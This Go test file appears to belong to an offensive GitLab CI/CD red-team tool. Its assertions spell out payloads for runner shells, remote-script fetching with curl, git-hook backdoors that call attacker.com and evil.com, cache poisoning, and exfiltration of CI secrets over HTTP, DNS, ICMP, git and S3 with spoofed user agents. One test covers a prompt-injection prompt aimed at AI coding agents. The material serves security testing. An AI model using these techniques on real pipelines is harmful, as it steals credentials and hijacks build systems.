package payloads

import (
	"strings"
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func mustParse(t *testing.T, s string) *pipeline.Document {
	t.Helper()
	d, err := pipeline.Parse(strings.NewReader(s))
	if err != nil {
		t.Fatalf("parse generated yaml: %v\n---\n%s\n---", err, s)
	}
	return d
}

func TestGenerateRORShellYAML_Command(t *testing.T) {
	y := GenerateRORShellYAML(RORShellOptions{Common: CommonOptions{JobName: "shell", Tags: []string{"self-hosted"}, Manual: true}, Command: "echo hi"})
	if !strings.Contains(y, "stages:") || !strings.Contains(y, "echo \"$CMD\"") {
		t.Fatalf("unexpected content: %s", y)
	}
	d := mustParse(t, y)
	if len(d.Jobs) == 0 || d.Jobs[0].Name != "shell" {
		t.Fatalf("expected job named shell, got %+v", d.Jobs)
	}
}

func TestGenerateRORShellYAML_Download(t *testing.T) {
	y := GenerateRORShellYAML(RORShellOptions{Common: CommonOptions{JobName: "dl", ArtifactsPath: "result"}, DownloadPath: "/etc/hosts"})
	if !strings.Contains(y, "artifacts:") {
		t.Fatalf("expected artifacts block: %s", y)
	}
	_ = mustParse(t, y)
}

func TestGeneratePwnRequestYAML(t *testing.T) {
	y := GeneratePwnRequestYAML(PwnRequestOptions{Common: CommonOptions{JobName: "pwn"}, TargetBranchExpr: "main|prod"})
	if !strings.Contains(y, "merge_request_event") {
		t.Fatalf("expected MR event condition: %s", y)
	}
	d := mustParse(t, y)
	if len(d.Jobs) == 0 {
		t.Fatalf("no jobs parsed")
	}
}

func TestGenerateRunnerOnRunnerYAML_OSSwitch(t *testing.T) {
	yWin := GenerateRunnerOnRunnerYAML(RunnerOnRunnerOptions{Common: CommonOptions{JobName: "ror"}, ScriptURL: "https://x/y.ps1", TargetOS: "windows"})
	if !strings.Contains(yWin, "powershell") {
		t.Fatalf("expected powershell in windows payload: %s", yWin)
	}
	_ = mustParse(t, yWin)
	yLin := GenerateRunnerOnRunnerYAML(RunnerOnRunnerOptions{Common: CommonOptions{JobName: "ror"}, ScriptURL: "https://x/y.sh", TargetOS: "linux"})
	if !strings.Contains(yLin, "curl -sSfL") {
		t.Fatalf("expected curl in linux payload: %s", yLin)
	}
	_ = mustParse(t, yLin)
}

func TestGenerateSecretsExfilYAML(t *testing.T) {
	y := GenerateSecretsExfilYAML(SecretsExfilOptions{Common: CommonOptions{JobName: "exfil", ArtifactsPath: "env.txt"}, WebhookURL: "https://webhook.local/hook"})
	if !strings.Contains(y, "printenv") || !strings.Contains(y, "artifacts:") {
		t.Fatalf("expected env dump and artifacts: %s", y)
	}
	_ = mustParse(t, y)
}

func TestDefaultAIInjectionPrompt(t *testing.T) {
	prompt := DefaultAIInjectionPrompt()
	if prompt == "" {
		t.Fatal("expected non-empty prompt")
	}
	expected := []string{
		"CLAUDE.md",
		"environment variables",
		"approve",
	}
	for _, s := range expected {
		if !strings.Contains(prompt, s) {
			t.Errorf("expected prompt to contain %q", s)
		}
	}
}

func TestGenerateGitHookYAML_Default(t *testing.T) {
	y := GenerateGitHookYAML(GitHookOptions{
		Common:      CommonOptions{Tags: []string{"shell"}},
		CallbackURL: "http://attacker.com/callback",
	})
	for _, want := range []string{"post-checkout", "HOOK_B64=", "base64 -d", "find", "/home/gitlab-runner/builds", "chmod +x"} {
		if !strings.Contains(y, want) {
			t.Errorf("expected %q in output:\n%s", want, y)
		}
	}
	_ = mustParse(t, y)
}

func TestGenerateGitHookYAML_CustomHookType(t *testing.T) {
	y := GenerateGitHookYAML(GitHookOptions{
		Common:      CommonOptions{JobName: "stealth"},
		CallbackURL: "http://evil.com",
		HookType:    "pre-push",
	})
	if !strings.Contains(y, "pre-push") {
		t.Fatalf("expected pre-push hook type, got:\n%s", y)
	}
	_ = mustParse(t, y)
}

func TestGenerateCachePoisonYAML_Default(t *testing.T) {
	y := GenerateCachePoisonYAML(CachePoisonOptions{
		Common: CommonOptions{Tags: []string{"shared"}},
	})
	for _, want := range []string{"cache:", "policy: push", "default", "Cache poison"} {
		if !strings.Contains(y, want) {
			t.Errorf("expected %q in output:\n%s", want, y)
		}
	}
	_ = mustParse(t, y)
}

func TestGenerateCachePoisonYAML_Custom(t *testing.T) {
	y := GenerateCachePoisonYAML(CachePoisonOptions{
		Common:    CommonOptions{JobName: "poison"},
		CacheKey:  "node-modules-$CI_COMMIT_REF_SLUG",
		CachePath: "node_modules/",
		PoisonCmd: "echo 'malicious()' >> node_modules/.package-lock.json",
	})
	if !strings.Contains(y, "node-modules-$CI_COMMIT_REF_SLUG") {
		t.Fatal("expected custom cache key")
	}
	if !strings.Contains(y, "node_modules/") {
		t.Fatal("expected custom cache path")
	}
	_ = mustParse(t, y)
}

func TestGenerateSecretsExfilYAML_ExfilMethods(t *testing.T) {
	tests := []struct {
		name         string
		opts         SecretsExfilOptions
		wantContains []string
	}{
		{
			name:         "default artifact unchanged",
			opts:         SecretsExfilOptions{Common: CommonOptions{JobName: "exfil", ArtifactsPath: "env.txt"}},
			wantContains: []string{"printenv", "artifacts:"},
		},
		{
			name: "http callback",
			opts: SecretsExfilOptions{
				Common:      CommonOptions{JobName: "exfil"},
				ExfilMethod: "http",
				ExfilTarget: "http://listener:8080/callback",
			},
			wantContains: []string{"base64 -w0 env.txt", "curl -sS -X POST", "User-Agent: GitLab-Webhook/1.0", "http://listener:8080/callback"},
		},
		{
			name: "dns exfil",
			opts: SecretsExfilOptions{
				Common:      CommonOptions{JobName: "exfil"},
				ExfilMethod: "dns",
				ExfilTarget: "attacker.com",
			},
			wantContains: []string{"base64 -w0 env.txt", "md5sum", "dig +short", "attacker.com", "sleep 0.1"},
		},
		{
			name: "icmp exfil",
			opts: SecretsExfilOptions{
				Common:      CommonOptions{JobName: "exfil"},
				ExfilMethod: "icmp",
				ExfilTarget: "1.2.3.4",
			},
			wantContains: []string{"xxd -p", "ping -c 1 -p", "1.2.3.4", "sleep 0.05"},
		},
		{
			name: "git exfil",
			opts: SecretsExfilOptions{
				Common:      CommonOptions{JobName: "exfil"},
				ExfilMethod: "git",
				ExfilTarget: "https://token@git.attacker.com/repo.git",
			},
			wantContains: []string{"git clone --depth 1", "https://token@git.attacker.com/repo.git", "git push -q origin HEAD"},
		},
		{
			name: "cloud exfil",
			opts: SecretsExfilOptions{
				Common:      CommonOptions{JobName: "exfil"},
				ExfilMethod: "cloud",
				ExfilTarget: "https://bucket.s3.amazonaws.com/path",
			},
			wantContains: []string{"curl -sS -X PUT", "User-Agent: aws-sdk-go/1.44.0", "https://bucket.s3.amazonaws.com/path"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			y := GenerateSecretsExfilYAML(tt.opts)
			for _, substr := range tt.wantContains {
				if !strings.Contains(y, substr) {
					t.Errorf("expected %q in output:\n%s", substr, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
